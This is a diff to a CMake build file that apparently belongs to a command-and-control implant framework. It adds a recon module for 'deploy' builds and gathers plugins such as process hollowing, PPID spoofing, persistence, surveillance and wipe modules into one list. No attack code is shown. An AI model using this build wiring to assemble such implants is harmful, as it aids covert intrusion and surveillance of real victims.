@@ -40,6 +40,11 @@ target_link_libraries(PPIDSpoofingStub CommandCore)
 add_library(ReconModule SHARED ../src/ReconModule.cpp)
 target_link_libraries(ReconModule CURL::libcurl CommandCore OpenSSL::Crypto)
 
+if(DEPLOY_BUILD)
+    add_library(ReconAdvancedModule SHARED ../src/ReconAdvancedModule.cpp)
+    target_link_libraries(ReconAdvancedModule CURL::libcurl CommandCore OpenSSL::Crypto)
+endif()
+
 add_library(ActiveSurveillanceModule SHARED ../src/ActiveSurveillanceModule.cpp)
 target_link_libraries(ActiveSurveillanceModule CURL::libcurl CommandCore OpenSSL::Crypto)
 
@@ -57,4 +62,8 @@ target_link_libraries(agent dl OpenSSL::Crypto CURL::libcurl CommandCore uuid)
 target_compile_definitions(agent PRIVATE STATIC_AGENT)
 
 install(TARGETS agent DESTINATION bin)
-install(TARGETS FingerprintModule CommandHandler UpdateHandler KeyExchange PersistenceModule ConfigModule CmdSafeMode CmdDeepSleep CmdWipe IPC ProcessHollowingStub PPIDSpoofingStub ReconModule ActiveSurveillanceModule DESTINATION plugins)
+set(PLUGIN_TARGETS FingerprintModule CommandHandler UpdateHandler KeyExchange PersistenceModule ConfigModule CmdSafeMode CmdDeepSleep CmdWipe IPC ProcessHollowingStub PPIDSpoofingStub ReconModule ActiveSurveillanceModule)
+if(DEPLOY_BUILD)
+    list(APPEND PLUGIN_TARGETS ReconAdvancedModule)
+endif()
+install(TARGETS ${PLUGIN_TARGETS} DESTINATION plugins)
